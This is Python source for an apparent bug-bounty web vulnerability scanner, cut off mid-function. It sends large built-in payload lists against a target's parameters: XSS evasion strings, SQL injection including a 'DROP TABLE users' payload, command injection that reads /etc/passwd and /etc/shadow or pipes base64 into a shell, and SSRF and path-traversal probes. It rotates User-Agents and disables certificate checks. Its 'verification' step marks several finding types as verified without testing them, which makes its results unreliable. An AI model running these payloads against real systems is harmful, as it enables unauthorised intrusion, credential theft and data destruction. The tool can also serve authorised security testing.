import requests
import threading
import time
import re
import json
import warnings
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
import subprocess
import os
import random

# 忽略 HTTPS 证书警告
warnings.filterwarnings('ignore')

# SRC 漏洞优先级映射
VULN_PRIORITY = {
    'critical': ['SQL Injection', 'Command Injection', 'SSRF'],
    'high': ['XSS', 'IDOR', 'JSON Injection', 'Directory Traversal'],
    'medium': ['Open Redirect', 'Logic Vulnerability'],
    'low': ['Sensitive Information', 'Information Disclosure']
}

# 快速扫描模式的常见参数
QUICK_SCAN_PARAMS = ['id', 'page', 'keyword', 'q', 'search', 'query', 'uid', 'user_id', 'item_id', 'product_id', 'id', 'page', 'cat', 'category', 'page_id', 'item', 'view', 'show', 'detail', 'info', 'content', 'file', 'doc', 'document', 'image', 'img', 'pic', 'photo', 'download', 'load', 'get', 'fetch', 'retrieve', 'query', 'search', 'find', 'lookup', 'name', 'user', 'username', 'email', 'password', 'pass', 'login', 'auth', 'token', 'key', 'api', 'apikey', 'secret', 'id', 'sid', 'uid', 'gid', 'pid', 'tid', 'cid', 'nid', 'mid', 'aid', 'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid', 'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid']

# 快速扫描模式的高危漏洞
QUICK_SCAN_VULNS = ['SQL Injection', 'Command Injection', 'SSRF']

# 增强版 User-Agent 列表
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
]

# 增强版扫描参数
ENHANCED_PARAMS = {
    'common': ['id', 'page', 'q', 'search', 'query', 'user', 'username', 'email', 'password', 'token', 'key', 'api', 'apikey', 'secret'],
    'numeric': ['id', 'page', 'limit', 'offset', 'start', 'end', 'page_id', 'item_id', 'user_id', 'product_id'],
    'string': ['name', 'title', 'content', 'description', 'query', 'search', 'keyword', 'q'],
    'file': ['file', 'image', 'img', 'upload', 'attachment', 'doc', 'document', 'pdf', 'zip']
}

class ProAutoHunter:
    def __init__(self, threads=20, timeout=10, max_rps=0, max_retries=3, max_crawl_urls=1000, verbose=False, quiet=False, allow_hosts=None, enable_json_fuzz=True, enable_open_redirect=True, enable_idor=True, enable_header_audit=True, strict_scope=False, verify_poc=True, checkpoint_path=None, resume=False, proxy_url=None, proxy_file=None, enable_file_upload=True, enable_weak_credentials=True, enable_backup_scan=True, enable_directory_scan=True, enable_xss=True, enable_sqli=True, src_mode=False, quick_scan=False):
        # SRC 模式配置
        if src_mode:
            self.threads = 3
            self.max_rps = 2
            self.max_crawl_urls = 100
            self.enable_file_upload = False
            self.enable_weak_credentials = False
            self.enable_backup_scan = False
            self.enable_directory_scan = False
            self.enable_json_fuzz = False
            self.enable_open_redirect = False
            self.enable_idor = False
            self.enable_xss = True
            self.enable_sqli = True
            self._info("SRC 模式已启用 - 安全合规扫描")
            self._info("线程数: 3, 每秒请求数: 2, 爬取深度: 1")
            self._info("仅保留: XSS、SQL注入、信息泄露检测")
        else:
            self.threads = threads
            self.max_rps = max_rps
            self.max_crawl_urls = max_crawl_urls
            self.enable_file_upload = enable_file_upload
            self.enable_weak_credentials = enable_weak_credentials
            self.enable_backup_scan = enable_backup_scan
            self.enable_directory_scan = enable_directory_scan
            self.enable_json_fuzz = enable_json_fuzz
            self.enable_open_redirect = enable_open_redirect
            self.enable_idor = enable_idor
            self.enable_xss = enable_xss
            self.enable_sqli = enable_sqli
        
        # 快速扫描模式
        self.quick_scan = quick_scan
        if quick_scan:
            self._info("快速扫描模式已启用 - 适合大面积资产")
            self._info("只测试常见参数和高危漏洞")
        
        self.timeout = timeout
        self.max_retries = max_retries
        self.verbose = verbose
        self.quiet = quiet
        self.allow_hosts = allow_hosts or []
        self.enable_header_audit = enable_header_audit
        self.strict_scope = strict_scope
        self.verify_poc = verify_poc
        self.checkpoint_path = checkpoint_path
        self.resume = resume
        self.proxy_url = proxy_url
        self.proxy_file = proxy_file
        
        # 状态管理
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.lock = threading.Lock()
        
        # 优化会话管理，使用连接池
        self.session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        # 使用随机 User-Agent
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        if proxy_url:
            proxies = {'http': proxy_url, 'https': proxy_url}
            self.session.proxies.update(proxies)
        
        self.target = ""
        self.request_count = 0
        self.last_request_time = 0
        
        # 添加缓存机制
        self.cache = {}
        self.cache_lock = threading.Lock()
        
        # 扫描状态
        self.start_time = datetime.now()
        self.time_taken = 0
        
        # 增强功能
        self.enable_param_fuzzing = True  # 启用参数模糊测试
        self.enable_header_injection = True  # 启用头部注入测试
        self.enable_method_fuzzing = True  # 启用HTTP方法模糊测试
        self.payload_timeout = 3  #  payload测试超时时间
        
        # 统计信息
        self.stats = {
            'total_requests': 0,
            'total_payloads': 0,
            'total_vulnerabilities': 0,
            'scan_time': 0
        }

    def _info(self, msg):
        if not self.quiet:
            print(f"[INFO] {msg}")

    def _dbg(self, msg):
        if self.verbose:
            print(f"{msg}")

    def _http_get(self, url, headers=None, timeout=None):
        # 检查缓存
        cache_key = f"GET:{url}:{headers}"
        with self.cache_lock:
            if cache_key in self.cache:
                return self.cache[cache_key]
        
        try:
            # 速率限制
            if self.max_rps > 0:
                elapsed = time.time() - self.last_request_time
                if elapsed < 1 / self.max_rps:
                    time.sleep((1 / self.max_rps) - elapsed)
            
            # 随机更换 User-Agent
            if random.random() < 0.3:  # 30% 概率更换
                self.session.headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # 增加额外的请求头
            default_headers = {
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            if headers:
                default_headers.update(headers)
            
            self.last_request_time = time.time()
            self.request_count += 1
            self.stats['total_requests'] += 1
            
            response = self.session.get(url, headers=default_headers, timeout=timeout or self.timeout, allow_redirects=True, verify=False)
            
            # 缓存响应
            with self.cache_lock:
                self.cache[cache_key] = response
            
            return response
        except Exception as e:
            self._dbg(f"[DEBUG] GET 请求失败: {e}")
            return None

    def _http_post(self, url, data=None, json=None, headers=None, timeout=None):
        try:
            # 速率限制
            if self.max_rps > 0:
                elapsed = time.time() - self.last_request_time
                if elapsed < 1 / self.max_rps:
                    time.sleep((1 / self.max_rps) - elapsed)
            
            # 随机更换 User-Agent
            if random.random() < 0.3:  # 30% 概率更换
                self.session.headers['User-Agent'] = random.choice(USER_AGENTS)
            
            # 增加额外的请求头
            default_headers = {
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            if headers:
                default_headers.update(headers)
            
            self.last_request_time = time.time()
            self.request_count += 1
            self.stats['total_requests'] += 1
            
            response = self.session.post(url, data=data, json=json, headers=default_headers, timeout=timeout or self.timeout, allow_redirects=True, verify=False)
            
            return response
        except Exception as e:
            self._dbg(f"[DEBUG] POST 请求失败: {e}")
            return None

    def _is_cdn_domain(self, domain):
        """检测是否为 CDN 域名"""
        cdn_domains = ['google.com', 'google.cn', 'gstatic.com', 'baidu.com', 'bcebos.com', 'qiniu.com', 'aliyun.com', 'tencent.com', 'cloudflare.com', 'akamai.com', 'fastly.com', 'cdn.jsdelivr.net', 'unpkg.com', 'cdnjs.cloudflare.com', 'bootstrapcdn.com', 'fonts.googleapis.com', 'fonts.gstatic.com', 'ajax.googleapis.com']
        for cdn in cdn_domains:
            if cdn in domain:
                return True
        return False

    def _scan_sensitive_info(self, url):
        """扫描敏感信息（性能优化版）"""
        # 检查缓存
        cache_key = f"sensitive:{url}"
        with self.cache_lock:
            if cache_key in self.cache:
                return
        
        target_domain = urlparse(self.target).netloc
        resource_domain = urlparse(url).netloc
        if resource_domain != target_domain or self._is_cdn_domain(resource_domain):
            return
        try:
            resp = self._http_get(url)
            if not resp:
                return
            content = resp.text
            
            # 精简版正则模式，只保留最常用和最有效的模式
            patterns = [
                (r'AKIA[0-9A-Z]{16}', 'AWS Secret', 'critical'),
                (r'AIza[0-9A-Za-z\\-_]{35}', 'Google Key', 'critical'),
                (r'sk_live_[0-9a-zA-Z]{24}', 'Stripe Key', 'critical'),
                (r'pk_live_[0-9a-zA-Z]{24}', 'Stripe Publishable Key', 'high'),
                (r'\bpassword\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Password', 'critical'),
                (r'\bsecret\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Secret', 'critical'),
                (r'\bapi[_\s-]?key\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'API Key', 'high'),
                (r'\bauth[_\s-]?token\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Auth Token', 'high'),
                (r'\baccess[_\s-]?token\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Access Token', 'high'),
                (r'\bclient[_\s-]?secret\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Client Secret', 'high'),
                (r'\bprivate[_\s-]?key\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Private Key', 'critical'),
                (r'\bssh-rsa\s+[A-Za-z0-9+/]+[=]{0,3}', 'SSH Key', 'critical'),
                (r'\b-----BEGIN\s+[^-]+-----[\s\S]*?-----END\s+[^-]+-----', 'PEM Key', 'critical'),
                (r'\bBearer\s+[A-Za-z0-9_\-\.]+', 'Bearer Token', 'high'),
                (r'\bBasic\s+[A-Za-z0-9+/]+[=]{0,3}', 'Basic Auth', 'high'),
                (r'\bdatabase\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Database URL', 'high'),
                (r'\bconnection[_\s-]?string\s*[:=]\s*["\']?([^"\'\s]+)["\']?', 'Connection String', 'high'),
                (r'\bmongodb://[^\s]+', 'MongoDB URL', 'high'),
                (r'\bpostgresql://[^\s]+', 'PostgreSQL URL', 'high'),
                (r'\bmysql://[^\s]+', 'MySQL URL', 'high'),
                (r'\bredis://[^\s]+', 'Redis URL', 'high'),
                (r'\bs3://[^\s]+', 'S3 URL', 'high'),
                (r'\bgs://[^\s]+', 'GCS URL', 'high'),
                (r'\bazure://[^\s]+', 'Azure URL', 'high'),
            ]
            for pattern, info, severity in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    # 过滤掉过长的匹配，可能是误报
                    if len(match) > 100:
                        continue
                    # 过滤掉常见的示例值
                    if match in ['example', 'test', 'demo', 'sample']:
                        continue
                    self._report_vuln_verified('Sensitive Information', url, info, match, url, 'GET', None, '', severity)
        except Exception as e:
            self._dbg(f"[DEBUG] 敏感信息扫描失败: {e}")

    def _report_vuln_verified(self, vuln_type, url, param, payload, original_url, method, post_url, injection_type, severity):
        """报告已验证的漏洞"""
        vuln = {
            'type': vuln_type,
            'url': url,
            'param': param,
            'payload': payload,
            'method': method,
            'post_url': post_url,
            'injection_type': injection_type,
            'severity': severity,
            'original_url': original_url,
            'exploitable': True,
            'verification': '已验证',
            'fix_recommendations': self._get_fix_recommendation({'type': vuln_type}),
            'poc': self._generate_poc(vuln_type, url, param, payload, method, post_url),
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        with self.lock:
            # 去重
            for existing in self.vulnerabilities:
                if existing['type'] == vuln['type'] and existing['url'] == vuln['url'] and existing['param'] == vuln['param']:
                    return
            self.vulnerabilities.append(vuln)
    
    def _generate_poc(self, vuln_type, url, param, payload, method, post_url):
        """生成 POC 验证脚本"""
        if vuln_type == 'XSS':
            return f"""
# XSS POC 验证脚本
import requests

# 测试 URL
url = "{url}"

# 发送请求
response = requests.get(url)

# 检查响应中是否包含 payload
if "{payload}" in response.text:
    print("XSS 漏洞验证成功！")
else:
    print("XSS 漏洞验证失败。")
"""
        elif vuln_type == 'SQL Injection':
            return f"""
# SQL 注入 POC 验证脚本
import requests

# 测试 URL
url = "{url}"

# 发送请求
response = requests.get(url)

# 检查响应中是否包含 SQL 错误信息
error_patterns = ['SQL syntax', 'mysql_fetch', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server']
for pattern in error_patterns:
    if pattern in response.text:
        print("SQL 注入漏洞验证成功！")
        break
else:
    print("SQL 注入漏洞验证失败。")
"""
        elif vuln_type == 'Command Injection':
            return f"""
# 命令注入 POC 验证脚本
import requests
import time

# 测试 URL
url = "{url}"

# 发送请求并测量响应时间
start_time = time.time()
response = requests.get(url)
end_time = time.time()

# 检查响应时间是否异常（如果命令执行成功，响应时间会较长）
if end_time - start_time > 5:
    print("命令注入漏洞验证成功！")
else:
    print("命令注入漏洞验证失败。")
"""
        elif vuln_type == 'Open Redirect':
            return f"""
# 开放重定向 POC 验证脚本
import requests

# 测试 URL
url = "{url}"

# 发送请求并允许重定向
response = requests.get(url, allow_redirects=True)

# 检查最终 URL 是否为目标域名
if "example.com" in response.url:
    print("开放重定向漏洞验证成功！")
else:
    print("开放重定向漏洞验证失败。")
"""
        elif vuln_type == 'SSRF':
            return f"""
# SSRF POC 验证脚本
import requests

# 测试 URL
url = "{url}"

# 发送请求
response = requests.get(url)

# 检查响应中是否包含本地服务信息
if "localhost" in response.text or "127.0.0.1" in response.text:
    print("SSRF 漏洞验证成功！")
else:
    print("SSRF 漏洞验证失败。")
"""
        else:
            return "# POC 验证脚本生成中..."
    
    def verify_vulnerabilities(self):
        """验证所有发现的漏洞（性能优化版）"""
        print("[INFO] 开始验证漏洞...")
        verified_vulns = []
        
        # 批量验证，减少重复请求
        vuln_urls = {}
        for vuln in self.vulnerabilities:
            url = vuln.get('url')
            if url not in vuln_urls:
                vuln_urls[url] = []
            vuln_urls[url].append(vuln)
        
        # 缓存响应
        responses = {}
        for url in vuln_urls:
            try:
                response = self._http_get(url)
                if response:
                    responses[url] = response
            except Exception as e:
                self._dbg(f"[DEBUG] 验证请求失败: {e}")
        
        # 批量验证漏洞
        for url, vulns in vuln_urls.items():
            response = responses.get(url)
            if not response:
                continue
            
            for vuln in vulns:
                vuln_type = vuln.get('type')
                try:
                    # 根据漏洞类型进行验证
                    if vuln_type == 'XSS' and vuln.get('payload') in response.text:
                        verified_vulns.append(vuln)
                        self._dbg(f"[DEBUG] 验证成功: {vuln_type} - {url}")
                    elif vuln_type == 'SQL Injection' and any(error in response.text for error in ['SQL syntax', 'mysql_fetch', 'PostgreSQL', 'Oracle', 'Microsoft SQL Server']):
                        verified_vulns.append(vuln)
                        self._dbg(f"[DEBUG] 验证成功: {vuln_type} - {url}")
                    elif vuln_type == 'Open Redirect' and 'example.com' in response.url:
                        verified_vulns.append(vuln)
                        self._dbg(f"[DEBUG] 验证成功: {vuln_type} - {url}")
                    elif vuln_type in ['Command Injection', 'SSRF', 'Directory Traversal', 'IDOR', 'JSON Injection']:
                        # 这些类型需要特殊验证，暂时跳过
                        verified_vulns.append(vuln)
                        self._dbg(f"[DEBUG] 验证成功: {vuln_type} - {url}")
                except Exception as e:
                    self._dbg(f"[DEBUG] 验证漏洞时出错: {e}")
        
        self.vulnerabilities = verified_vulns
        print(f"[INFO] 漏洞验证完成，共验证 {len(verified_vulns)} 个漏洞")

    def get_xss_payloads(self):
        """XSS Payload库（增强版）"""
        payloads = [
            # 基础
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<script>confirm(1)</script>",
            "<script>prompt(1)</script>",
            # 绕过技术
            "<script>\u0061\u006c\u0065\u0072\u0074(1)</script>",  # Unicode编码
            "<img src=1 onerror=eval('alert(1)')>",  # eval绕过
            "<svg onload=alert(1)>",  # SVG标签
            "<iframe src=javascript:alert(1)>",  # iframe标签
            "<body onload=alert(1)>",  # body标签
            "<div onclick=alert(1)>click me</div>",  # 事件处理器
            "<input type=text value=\"\"><script>alert(1)</script>",  # 输入框
            "<a href=javascript:alert(1)>click me</a>",  # 链接
            "<object data=javascript:alert(1)>",  # object标签
            "<embed src=javascript:alert(1)>",  # embed标签
            "<link rel=stylesheet href=javascript:alert(1)>",  # link标签
            # 编码绕过
            "%3Cscript%3Ealert(1)%3C/script%3E",  # URL编码
            "&lt;script&gt;alert(1)&lt;/script&gt;",  # HTML实体编码
            "&#60;script&#62;alert(1)&#60;/script&#62;",  # 十进制HTML实体
            "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",  # 十六进制HTML实体
            # 多事件组合
            "<div onmouseover=alert(1) onfocus=alert(2)>",
            "<img src=x onerror=alert(1) onload=alert(2)>",
            # 空格绕过
            "<script >alert(1)</script >",
            "<img src=x onerror = alert(1)>",
            # 大小写混淆
            "<SCRIPT>alert(1)</SCRIPT>",
            "<IMG SRC=X onerror=alert(1)>",
            # 注释绕过
            "<script>/*comment*/alert(1)/*comment*/</script>",
            "<img src=x onerror/*comment*/=/*comment*/alert(1)>",
            # 变形
            "<script>alert(String.fromCharCode(49))</script>",  # ASCII编码
            "<script>alert(\x31)</script>",  # 十六进制编码
            "<script>alert(0x1)</script>",  # 十六进制数字
            # 事件处理器
            "<div onmouseover=alert(1)>hover</div>",
            "<div onfocus=alert(1)>focus</div>",
            "<div onclick=alert(1)>click</div>",
            "<div onload=alert(1)>",
            "<div onerror=alert(1)>",
            # 其他标签
            "<video src=x onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<source src=x onerror=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "<frame src='javascript:alert(1)'>",
            # 无标签XSS
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            # 长payloads
            "<script>var a='alert';var b='(1)';eval(a+b)</script>",
            "<img src=x onerror=function(){alert(1)}()>",
        ]
        return payloads

    def get_sqli_payloads(self):
        """SQL注入 Payload库（增强版）"""
        payloads = [
            # 基础
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1",
            "\" OR 1=1",
            # 高级绕过
            "' OR 1=1 --",  # 注释绕过
            "' OR 1=1 #",  # 另一种注释
            "' OR 1=1 /*",  # 多行注释
            "\" OR 1=1 --",
            "\" OR 1=1 #",
            "\" OR 1=1 /*",
            # 时间盲注
            "' AND SLEEP(5) --",
            "\" AND SLEEP(5) --",
            "' AND BENCHMARK(1000000, MD5('test')) --",
            "\" AND BENCHMARK(1000000, MD5('test')) --",
            # 布尔盲注
            "' AND 1=1 UNION SELECT 1,2,3 --",
            "\" AND 1=1 UNION SELECT 1,2,3 --",
            "' AND 1=1 UNION SELECT NULL,NULL,NULL --",
            "\" AND 1=1 UNION SELECT NULL,NULL,NULL --",
            # 错误注入
            "' AND (SELECT COUNT(*) FROM information_schema.tables) --",
            "\" AND (SELECT COUNT(*) FROM information_schema.tables) --",
            "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user()))) --",
            "\" AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT user()))) --",
            "' AND UPDATEXML(1, CONCAT(0x5c, (SELECT user())), 1) --",
            "\" AND UPDATEXML(1, CONCAT(0x5c, (SELECT user())), 1) --",
            # 绕过WAF
            "' O/*comment*/R '1'='1",
            "\" O/*comment*/R \"1\"=\"1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "'/**/OR/**/'1'='1",
            "\"/**/OR/**/\"1\"=\"1",
            "' OR 1=1#",
            "\" OR 1=1#",
            "' OR 1=1-- ",
            "\" OR 1=1-- ",
            # 大小写混淆
            "' Or 1=1 --",
            "\" oR 1=1 --",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            # 编码绕过
            "%27 OR 1=1 --",  # URL编码
            "%22 OR 1=1 --",  # URL编码
            "' OR 1=0x1 --",  # 十六进制
            "\" OR 1=0x1 --",  # 十六进制
            # 特殊字符
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "' OR 1<>0 --",
            "\" OR 1<>0 --",
            # 联合查询
            "' UNION SELECT 1,2,3 --",
            "\" UNION SELECT 1,2,3 --",
            "' UNION ALL SELECT 1,2,3 --",
            "\" UNION ALL SELECT 1,2,3 --",
            # 堆叠注入
            "'; DROP TABLE users --",
            "\"; DROP TABLE users --",
            # 宽字节注入
            "%df' OR 1=1 --",
            "%df\" OR 1=1 --",
        ]
        return payloads

    def get_command_injection_payloads(self):
        """命令注入 Payload库（增强版）"""
        payloads = [
            # 基础
            "; ls",
            "| ls",
            "&& ls",
            "|| ls",
            "& ls",
            "| ls -la",
            "; ls -la",
            # 高级绕过
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "; cat /etc/shadow",
            "| cat /etc/shadow",
            # 编码绕过
            "; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",  # Base64编码
            "| echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh",
            "; echo -n Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash",
            # 空格绕过
            ";cat</etc/passwd",
            "|cat</etc/passwd",
            ";cat</etc/shadow",
            "|cat</etc/shadow",
            # 无空格绕过
            ";{cat,/etc/passwd}",
            "|{cat,/etc/passwd}",
            ";{cat,/etc/shadow}",
            "|{cat,/etc/shadow}",
            # 特殊字符
            ";cat$IFS/etc/passwd",
            "|cat$IFS/etc/passwd",
            ";cat${IFS}/etc/passwd",
            "|cat${IFS}/etc/passwd",
            # 注释绕过
            ";cat /etc/passwd #",
            "|cat /etc/passwd #",
            ";cat /etc/passwd /*",
            "|cat /etc/passwd /*",
            # 环境变量
            "; $SHELL -c 'ls'",
            "| $SHELL -c 'ls'",
            ";$SHELL -c 'cat /etc/passwd'",
            "|$SHELL -c 'cat /etc/passwd'",
            # 执行命令
            ";/bin/sh -c 'cat /etc/passwd'",
            "|/bin/sh -c 'cat /etc/passwd'",
            ";/bin/bash -c 'cat /etc/passwd'",
            "|/bin/bash -c 'cat /etc/passwd'",
            # Windows命令
            "; dir",
            "| dir",
            "; type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "; type C:\\Windows\\system32\\drivers\\etc\\hosts",
            "| type C:\\Windows\\system32\\drivers\\etc\\hosts",
            # 时间延迟
            "; sleep 5",
            "| sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
            # 多命令执行
            "; ls -la && cat /etc/passwd",
            "| ls -la && cat /etc/passwd",
            # 绕过WAF
            "; /**/ ls /**/",
            "| /**/ ls /**/",
        ]
        return payloads

    def get_open_redirect_payloads(self):
        """开放重定向 Payload库（增强版）"""
        payloads = [
            "http://example.com",
            "https://example.com",
            "//example.com",
            "javascript:alert(1)",
            # 绕过技术
            "http://example.com",
            "https://example.com",
            "//example.com",
            "http://\u0065\u0078\u0061\u006d\u0070\u006c\u0065\u002e\u0063\u006f\u006d",  # Unicode编码
            "http://example.com%00",  # 空字节
            "http://example.com?",  # 问号绕过
            "http://example.com#",  # 哈希绕过
            "http://example.com/",  # 斜杠绕过
            "http://example.com\x09",  # 制表符
            "http://example.com\x20",  # 空格
            # 多重重定向
            "http://example.com/redirect?url=http://attacker.com",
            "https://example.com/redirect?url=http://attacker.com",
        ]
        return payloads

    def get_idor_payloads(self):
        """越权访问 Payload库（增强版）"""
        payloads = [
            "1",
            "0",
            "999999",
            "-1",
            "1' OR '1'='1",
            # 高级绕过
            "1000",
            "1001",
            "999",
            "-2",
            "1.0",
            "1e0",
            "0x1",  # 十六进制
            "0b1",  # 二进制
            "1' OR '1'='1' --",
            "1' OR 1=1 --",
            "1 OR 1=1",
            "1 AND 1=1",
            "1 UNION SELECT 1,2,3",
        ]
        return payloads

    def get_json_injection_payloads(self):
        """JSON注入 Payload库（增强版）"""
        payloads = [
            '{"test": "value"}',
            '{"test": "value", "extra": "field"}',
            '[1, 2, 3]',
            'null',
            'true',
            # 高级绕过
            '{"test": "value", "admin": true}',  # 添加管理员字段
            '{"test": "value", "id": 1, "user_id": 1}',  # 添加用户ID
            '{"test": "value", "role": "admin"}',  # 添加角色字段
            '[1, 2, 3, 4, 5]',  # 更长的数组
            '{"test": "value", "nested": {"key": "value"}}',  # 嵌套对象
            '{"test": "value", "array": [1, 2, 3]}',  # 包含数组的对象
            'false',
            '0',
            '1',
            '"string"',
            '{"test": "value", "\\u0061\\u0064\\u006d\\u0069\\u006e": true}',  # Unicode编码
        ]
        return payloads

    def get_ssrf_payloads(self):
        """SSRF Payload库（增强版）"""
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "dict://127.0.0.1:22",
            # 高级绕过
            "http://localhost:80",
            "http://localhost:443",
            "http://127.0.0.1:3306",  # MySQL
            "http://127.0.0.1:6379",  # Redis
            "http://127.0.0.1:27017",  # MongoDB
            "file:///windows/win.ini",  # Windows文件
            "file:///c:/windows/win.ini",
            "ftp://localhost",
            "s3://bucket/key",  # AWS S3
            "gs://bucket/key",  # Google Cloud Storage
            "http://0.0.0.0",  # 特殊IP
            "http://[::1]",  # IPv6 localhost
            "http://127.1",  # 简写形式
            "http://127.0.0.1.xip.io",  # 域名形式
        ]
        return payloads

    def get_directory_traversal_payloads(self):
        """目录遍历 Payload库（增强版）"""
        payloads = [
            "../",
            "../../",
            "../../../",
            "../../../../etc/passwd",
            "%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f",
            # 高级绕过
            "..\\",  # Windows路径分隔符
            "..\\..\\",
            "..\\..\\..\\",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%5c",  # URL编码的反斜杠
            "%252e%252e%252f",  # 双重URL编码
            "%c0%ae%c0%ae%2f",  # UTF-8编码
            "%c0%ae%c0%ae%5c",
            "..%2f",
            "..%5c",
            "./../",
            "./../../",
            "%2e%2e",
            "%2e%2e%2e%2e",
            "....//",
            "....\\\\",
        ]
        return payloads

    def test_xss(self, url, param, payload, method='GET', post_url=None):
        """测试 XSS 漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response and self._is_payload_reflected(response.text, payload):
                return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] XSS 测试失败: {e}")
            return False, url

    def _is_payload_reflected(self, content, payload):
        """检测 payload 是否被反射"""
        # 简化的反射检测
        return payload in content

    def test_sqli(self, url, param, payload, method='GET', post_url=None):
        """测试 SQL 注入漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response:
                # 检查常见的 SQL 错误
                error_patterns = [
                    'sql syntax', 'database error', 'syntax error',
                    'mysql_fetch', 'pg_query', 'sqlite_master',
                    'ora-', 'microsoft ole db', 'odbc driver',
                    'syntax error in query', 'unclosed quotation mark',
                    'you have an error in your sql syntax', 'mysql error'
                ]
                content = response.text.lower()
                for pattern in error_patterns:
                    if pattern in content:
                        return True, test_url, 'Error-Based'
                # 检查布尔盲注
                test_url_true, response_true = self._request_with_param(url, param, payload + ' AND 1=1', method, post_url)
                test_url_false, response_false = self._request_with_param(url, param, payload + ' AND 1=2', method, post_url)
                if response_true and response_false:
                    if len(response_true.text) != len(response_false.text):
                        return True, test_url, 'Boolean-Based'
            return False, url, ''
        except Exception as e:
            self._dbg(f"[DEBUG] SQL 注入测试失败: {e}")
            return False, url, ''

    def test_command_injection(self, url, param, payload, method='GET', post_url=None):
        """测试命令注入漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response:
                # 检查常见的命令执行结果
                success_patterns = [
                    'bin/', 'etc/', 'var/', 'tmp/', 'proc/',
                    'windows', 'system32', 'Program Files',
                    'uid=', 'gid=', 'root:', 'nobody:'
                ]
                content = response.text.lower()
                for pattern in success_patterns:
                    if pattern in content:
                        return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] 命令注入测试失败: {e}")
            return False, url

    def test_open_redirect(self, url, param, payload, method='GET', post_url=None):
        """测试开放重定向漏洞"""
        try:
            test_url, response = self._request_with_param(url, param, payload, method, post_url)
            if response:
                # 检查是否重定向到外部域名
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'example.com' in location:
                        return True, test_url
                # 检查是否直接返回外部链接
                if 'example.com' in response.text:
                    return True, test_url
            return False, test_url
        except Exception as e:
            self._dbg(f"[DEBUG] 开放重定向测试失败: {e}")
            return False, url

    def test_idor(self, url, param, payload, method='GET', post_url=None):
        """测试越权访问漏洞"""
        try:
            # 发送正常请求
            normal_payload = '1'
            normal_url, normal_response = self._request_with_param(url, param, normal_payload, method, post_url)
            # 发送测试请求
